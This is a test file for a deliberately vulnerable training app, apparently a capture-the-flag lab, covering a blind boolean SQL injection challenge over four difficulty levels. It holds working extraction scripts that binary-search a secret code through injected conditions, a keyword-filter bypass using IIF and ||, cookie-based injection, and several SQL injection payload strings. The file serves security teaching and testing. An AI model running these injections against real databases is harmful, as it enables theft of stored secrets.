// src/districts/relic-market/rm-02-blind-boolean-sqli/rm-02.spec.ts
import { describe, it, expect } from 'vitest';
import type { Express } from 'express';
import type request from 'supertest';
import {
  bare, describeExploitMatrix, describeLabView, freshSession, setCookieHeader, DB_ERROR_RE, FLAG_RE, type Agent,
} from '../../../../tests/helpers.js';
import { LEVELS, type Level } from '../../../core/levels.js';
import { describeCurlExample } from '../../_shared/curl.testkit.js';
import { RM02 } from './challenge.js'; // registers RM-02 before createApp() inside freshSession
import { staffCode, stockDb } from './model.js';

const LAB = '/d/relic-market/blind-boolean-sqli';
interface Ctx { readonly agent: Agent; readonly level: Level; readonly sid: string; readonly app: Express }
type Script = (c: Ctx) => Promise<request.Response>;

const url = (c: Pick<Ctx, 'level'>, sub = '') => `${LAB}${sub}?level=${c.level}`;
const post = (c: Ctx, sub: string, body: Record<string, string>) => c.agent.post(url(c, sub)).type('form').send(body);
const check = (c: Ctx, sku: string) => post(c, '/check', { sku });
const redeem = (c: Ctx, code: string) => post(c, '/redeem', { code });
/** The stock checker as curl without a jar would send it: only the session cookie and a hand-written region cookie. */
const checkWithCookie = (c: Ctx, sku: string, cookie: string) =>
  bare(c.app, c.sid, cookie).post(url(c, '/check')).type('form').send({ sku });

/** The lab message's text, unescaped enough to compare answers byte for byte. */
const messageOf = (html: string): string => /<p class="lab-message[^>]*>([\s\S]*?)<\/p>/.exec(html)?.[1] ?? '';
/** The only oracle a blind player has: "In stock" or anything else. A broken oracle must extract garbage, not hang. */
const inStock = (res: request.Response): boolean => /class="lab-message lab-success"[^>]*>[^<]*In stock/.test(res.text);

const ALPHABET = '0123456789abcdef';
/** Binary search over the sorted hex alphabet (4 questions a character), then redeem what was read. */
async function extractAndRedeem(c: Ctx, ask: (c: Ctx, index: number, above: string) => Promise<boolean>): Promise<request.Response> {
  let code = '';
  for (let i = 1; i <= 8; i++) {
    let lo = 0;
    let hi = ALPHABET.length - 1;
    while (lo < hi) {
      const mid = (lo + hi) >> 1;
      if (await ask(c, i, ALPHABET[mid])) lo = mid + 1; else hi = mid;
    }
    code += ALPHABET[lo];
  }
  return redeem(c, code);
}
const cond = (i: number, above: string) => `substr((SELECT code FROM staff_codes),${i},1) > '${above}'`;

// Acolyte: both inputs are concatenated; comment out the region check.
const acolyteExploit: Script = (c) => extractAndRedeem(c, async (cc, i, ch) =>
  inStock(await check(cc, `RELIC-CHALICE' AND ${cond(i, ch)}-- `)));
// Templar: AND, OR, comments and ; are blocked. IIF and || are not: the condition picks the SKU.
const templarExploit: Script = (c) => extractAndRedeem(c, async (cc, i, ch) =>
  inStock(await check(cc, `' || IIF(${cond(i, ch)}, 'RELIC-CHALICE', '') || '`)));
// Inquisitor: the SKU is bound, the region cookie (written by the app itself, so "trusted") is concatenated. The cookie
// is named for the level it is sent to, so the same script is also what a player would try at Divine.
const inquisitorExploit: Script = (c) => extractAndRedeem(c, async (cc, i, ch) =>
  inStock(await checkWithCookie(cc, 'RELIC-CHALICE', `relic_region_${cc.level}=${encodeURIComponent(`eu' AND ${cond(i, ch)} AND 'x'='x`)}`)));

describeExploitMatrix<Script>({
  challenge: RM02,
  path: LAB,
  send: (agent, level, script, _url, { sid, app }) => script({ agent, level, sid, app: app as Express }),
  exploits: { acolyte: acolyteExploit, templar: templarExploit, inquisitor: inquisitorExploit },
  resisted: 'Invalid staff code.',
  legit: [{ name: 'check the chalice', input: (c) => check(c, 'RELIC-CHALICE'), expect: 'RELIC-CHALICE: In stock (eu).' }],
  // The blind labs show no DB text at ANY level (decision Q4), so there is nothing for (d) to look for: see
  // "no database text at any level" below, which is the explicit case.
  malformed: [],
  privileged: { name: 'the real staff code at Divine', input: (c) => redeem(c, staffCode('divine')), expect: 'Staff code accepted.' },
});

describeLabView({
  challenge: RM02,
  path: LAB,
  account: /You are browsing as a guest\./,
  echoField: 'sku',
  extra: { intent: 'check' },
  oddBodies: [
    { intent: 'check', sku: { a: 1 } }, { intent: ['check'], sku: ['x'] }, { intent: 'redeem', code: { $ne: 1 } },
    { intent: 'region', region: { a: 1 } }, { intent: 'region', region: ['eu', 'us'] }, [], { intent: { constructor: 1 } },
  ],
  ok: (agent, level) => agent.post(`${LAB}?level=${level}`).type('form').send({ intent: 'check', sku: 'RELIC-CHALICE' }),
  bad: (agent, level) => agent.post(`${LAB}?level=${level}`).type('form').send({ intent: 'check', sku: 'RELIC-NOPE' }),
});

describeCurlExample({
  challenge: RM02, path: LAB,
  curl: (level) => ({ path: '/check', form: ['sku=RELIC-CHALICE'], cookies: [`relic_region_${level}=eu`] }),
});

describe('RM-02 blind boolean SQLi', () => {
  it('every level has its own random 8-hex staff code, stable per level', () => {
    const codes = LEVELS.map((l) => staffCode(l));
    for (const k of codes) expect(k).toMatch(/^[0-9a-f]{8}$/);
    expect(new Set(codes).size).toBe(LEVELS.length);
    expect(staffCode('templar')).toBe(staffCode('templar'));
    for (const l of LEVELS) {
      expect((stockDb(l).prepare('SELECT holder, code FROM staff_codes').all())).toEqual([{ holder: 'relic_admin', code: staffCode(l) }]);
    }
  });

  it('stock answers follow the data and the region cookie (honest use)', async () => {
    const { agent, sid, app } = await freshSession();
    const c: Ctx = { agent, level: 'acolyte', sid, app };
    for (const [sku, region, want] of [
      ['RELIC-CHALICE', 'eu', true], ['RELIC-CHALICE', 'us', true], ['RELIC-CHALICE', 'apac', false],
      ['RELIC-LANTERN', 'eu', false], ['RELIC-LANTERN', 'us', false], ['RELIC-LANTERN', 'apac', false],
      ['RELIC-ICON', 'eu', false], ['RELIC-ICON', 'apac', true], ['RELIC-NOPE', 'eu', false],
    ] as const) {
      const res = await checkWithCookie(c, sku, `relic_region_acolyte=${region}`);
      expect(res.status, `${sku} ${region}`).toBe(200);
      expect(inStock(res), `${sku} ${region}`).toBe(want);
      if (want) expect(messageOf(res.text), `${sku} ${region}`).toBe(`${sku}: In stock (${region}).`);
      else expect(messageOf(res.text), `${sku} ${region}`).toBe('Not available.');
    }
  });

  it('the region setter writes only allowlisted values, as a plain per-level cookie under the lab path, and the page shows it', async () => {
    for (const level of LEVELS) {
      const { agent, sid, app } = await freshSession();
      const c: Ctx = { agent, level, sid, app };
      const name = `relic_region_${level}`;
      const set = await post(c, '/region', { region: 'apac' });
      const line = setCookieHeader(set, name);
      expect(line, level).toBeDefined();
      expect(line, level).toContain('apac');
      expect(line, level).toContain(`Path=${LAB}`);
      expect(line, level).not.toMatch(/HttpOnly/i); // a preference: editing it is the lesson
      expect(set.text, level).toMatch(/Your region: <code>apac<\/code>/);
      expect((await agent.get(url(c))).text, level).toMatch(/Your region: <code>apac<\/code>/);
      expect(inStock(await check(c, 'RELIC-ICON')), level).toBe(true); // the jar now sends apac
      for (const bad of ["eu' OR '1'='1", 'mars', '', 'EU']) {
        const res = await post(c, '/region', { region: bad });
        expect(setCookieHeader(res, name), `${level} ${bad}`).toBeUndefined();
        expect(messageOf(res.text), `${level} ${bad}`).toBe('Unknown region.');
      }
    }
  });

  it('one level\'s region cookie never reaches another level (distinct names)', async () => {
    const { agent, sid, app } = await freshSession();
    const c: Ctx = { agent, level: 'templar', sid, app };
    const res = await checkWithCookie(c, 'RELIC-ICON', 'relic_region_acolyte=apac');
    expect(inStock(res)).toBe(false); // templar reads relic_region_templar: default eu
  });

  it('no database text at any level: a broken query is the ordinary "Not available."', async () => {
    const { agent, sid, app } = await freshSession();
    for (const level of LEVELS) {
      const c: Ctx = { agent, level, sid, app };
      const miss = messageOf((await check(c, 'RELIC-NOPE')).text);
      expect(miss, level).toBe('Not available.');
      const bodies: request.Response[] = [
        await check(c, "'"), await check(c, "RELIC-CHALICE'''"), await check(c, "' || (SELECT"), await check(c, '\\'),
        await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_${level}=${encodeURIComponent("'")}`),
        await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_${level}=${encodeURIComponent("eu' AND (SELECT 1 FROM nope)--")}`),
        await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_${level}=${encodeURIComponent("eu' AND ")}`),
      ];
      for (const res of bodies) {
        expect(res.status, level).toBe(200);
        expect(res.text, level).not.toMatch(DB_ERROR_RE);
        expect(res.text, level).not.toMatch(/SQLITE|near "|no such (table|column)|unrecognized|incomplete input/i);
        expect(res.text, level).not.toMatch(FLAG_RE);
        expect(messageOf(res.text), level).toMatch(/^(Not available\.|Invalid SKU\.|RELIC-CHALICE: In stock \(.*\)\.)$/);
      }
      // A genuine syntax error looks exactly like a plain miss (where the level lets it through).
      if (level !== 'divine') {
        const broken = level === 'inquisitor'
          ? await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_${level}=${encodeURIComponent("'")}`)
          : await check(c, "'");
        expect(messageOf(broken.text), level).toBe(miss);
      }
    }
  });

  it('templar: AND, OR, comments and semicolons are refused in the SKU and in the region; IIF, CASE and || are not', async () => {
    const { agent, sid, app } = await freshSession();
    const c: Ctx = { agent, level: 'templar', sid, app };
    for (const sku of ["RELIC-CHALICE' AND 1=1-- ", "x' or '1'='1", "x'; SELECT 1", 'x # y', "x' And 1", "x' -- y"]) {
      expect(messageOf((await check(c, sku)).text), sku).toBe('Invalid SKU.');
    }
    const region = await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_templar=${encodeURIComponent("eu' OR 1=1 OR 'a'='a")}`);
    expect(messageOf(region.text)).toBe('Invalid SKU.');
    // Words that merely contain "or" or "and" are fine (the filter is word-bounded).
    expect(messageOf((await check(c, 'RELIC-ORDER-HANDLE')).text)).toBe('Not available.');
    const sneaky = `' || CASE WHEN ${cond(1, '/')} THEN 'RELIC-CHALICE' ELSE '' END || '`;
    expect(inStock(await check(c, sneaky))).toBe(true);
  });

  it('inquisitor: the SKU is bound, so a quote there is data; only the region cookie reaches the SQL', async () => {
    const { agent, sid, app } = await freshSession();
    const c: Ctx = { agent, level: 'inquisitor', sid, app };
    expect(inStock(await check(c, `RELIC-CHALICE' AND ${cond(1, '/')}-- `))).toBe(false);
    expect(inStock(await check(c, `' || IIF(${cond(1, '/')}, 'RELIC-CHALICE', '') || '`))).toBe(false);
    expect(inStock(await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_${c.level}=${encodeURIComponent(`eu' AND ${cond(1, '/')} AND 'x'='x`)}`))).toBe(true);
    expect(inStock(await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_${c.level}=${encodeURIComponent(`eu' AND ${cond(1, '~')} AND 'x'='x`)}`))).toBe(false);
  });

  it('divine: both bound, the region is an allowlist (anything else is eu), answers are uniform', async () => {
    const { agent, sid, app } = await freshSession();
    const c: Ctx = { agent, level: 'divine', sid, app };
    // A forged cookie is not data in a query and not a region: it falls back to eu (the answer carries no echo of it).
    for (const forged of ["eu' AND 1=0 AND 'x'='x", 'mars', "apac' OR '1'='1", '']) {
      const res = await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_divine=${encodeURIComponent(forged)}`);
      expect(messageOf(res.text), forged).toBe('RELIC-CHALICE: In stock (eu).');
    }
    expect(inStock(await checkWithCookie(c, 'RELIC-ICON', 'relic_region_divine=apac'))).toBe(true);
    expect(inStock(await check(c, `RELIC-CHALICE' AND ${cond(1, '/')}-- `))).toBe(false);
    // A JSON-style cookie (cookie-parser turns "j:{...}" into an object) is no region either.
    const j = await checkWithCookie(c, 'RELIC-CHALICE', `relic_region_divine=${encodeURIComponent('j:{"a":1}')}`);
    expect(messageOf(j.text)).toBe('RELIC-CHALICE: In stock (eu).');
  });

  it('a JSON-style region cookie is no region at any level (a failed lookup, never a 500)', async () => {
    const { agent, sid, app } = await freshSession();
    for (const level of LEVELS) {
      const res = await checkWithCookie({ agent, level, sid, app }, 'RELIC-CHALICE', `relic_region_${level}=${encodeURIComponent('j:{"a":1}')}`);
      expect(res.status, level).toBe(200);
      expect(res.text, level).not.toMatch(DB_ERROR_RE);
      expect(res.text, level).not.toMatch(FLAG_RE);
    }
  });

  it('a staff code read at one level redeems nowhere else, and only the exact code redeems', async () => {
    const { agent, sid, app } = await freshSession();
    const real = staffCode('acolyte');
    expect(messageOf((await redeem({ agent, level: 'acolyte', sid, app }, real)).text)).toMatch(/^Staff code accepted\. Flag: HVWA\{[0-9a-f]{32}\}$/);
    for (const level of ['templar', 'inquisitor', 'divine'] as const) {
      const res = await redeem({ agent, level, sid, app }, real);
      expect(messageOf(res.text), level).toBe('Invalid staff code.');
      expect(res.text, level).not.toMatch(FLAG_RE);
    }
    const c: Ctx = { agent, level: 'acolyte', sid, app };
    for (const bad of ['', real.slice(0, 7), `${real}0`, ` ${real}`, `${real} `, real.slice(0, 7) + (real.endsWith('0') ? '1' : '0')]) {
      expect(messageOf((await redeem(c, bad)).text), JSON.stringify(bad)).toBe('Invalid staff code.');
    }
    const odd = await c.agent.post(url(c, '/redeem')).send({ code: { toString: 1 } });
    expect(odd.status).toBe(200);
    expect(messageOf(odd.text)).toBe('Invalid staff code.');
  });

  it('there is deliberately no limiter: 8 hex characters are no brute-force target, and many wrong codes change nothing', async () => {
    const { agent, sid, app } = await freshSession();
    const c: Ctx = { agent, level: 'acolyte', sid, app };
    for (let i = 0; i < 40; i++) expect(messageOf((await redeem(c, `0000000${i % 10}`)).text)).toBe('Invalid staff code.');
    expect(messageOf((await redeem(c, staffCode('acolyte'))).text)).toMatch(/^Staff code accepted\. Flag: /);
  });

  it('the page lists the product SKUs, keeps a typed SKU escaped, and offers the redeem form', async () => {
    const { agent } = await freshSession();
    const html = (await agent.get(`${LAB}?level=acolyte`)).text;
    for (const sku of ['RELIC-CHALICE', 'RELIC-LANTERN', 'RELIC-ICON']) expect(html).toContain(sku);
    expect(html).toContain('Redeem staff code (8 characters)');
    expect(html).toContain('<select name="region">');
    expect(html).not.toMatch(/class="lab-message/);
  });

  it('has no Restart: the lab mutates nothing', async () => {
    const { agent } = await freshSession();
    expect((await agent.post(`${LAB}/_reset?level=acolyte`)).status).toBe(404);
  });
});

describe('RM-02 names its target', () => {
  it('the summary (ID and EN) and the lab page name the staff_codes table and its code column', async () => {
    const { agent } = await freshSession();
    for (const p of ['/c/RM-02?lang=en', '/c/RM-02?lang=id', `${LAB}?level=acolyte`]) {
      const html = (await agent.get(p)).text;
      expect(html, p).toContain('staff_codes');
      expect(html, p).toMatch(/\bcode\b/);
    }
  });
});
